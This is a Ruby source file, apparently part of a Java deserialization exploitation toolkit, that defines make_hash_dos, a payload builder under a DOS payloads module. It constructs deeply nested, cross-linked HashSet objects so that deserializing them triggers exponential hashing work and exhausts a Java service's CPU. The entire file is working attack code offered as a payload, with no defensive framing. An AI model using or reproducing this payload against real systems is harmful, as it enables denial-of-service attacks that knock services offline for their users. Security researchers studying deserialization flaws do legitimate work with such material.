
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module DOS
        def make_hash_dos(nestingLevel)
          root = JavaObject.new('Ljava/util/HashSet;', 'elements' => [])

          a = root
          b = JavaObject.new('Ljava/util/HashSet;', 'elements' => [])

          for i in 1...nestingLevel
            t1 = JavaObject.new('Ljava/util/HashSet;', 'elements' => ['foo'])
            t2 = JavaObject.new('Ljava/util/HashSet;', 'elements' => [])

            a.fields['elements'].push(t1)
            a.fields['elements'].push(t2)

            b.fields['elements'].push(t1)
            b.fields['elements'].push(t2)

            a = t1
            b = t2
          end

          root
        end

        module_function :make_hash_dos
        end
    end
  end
end
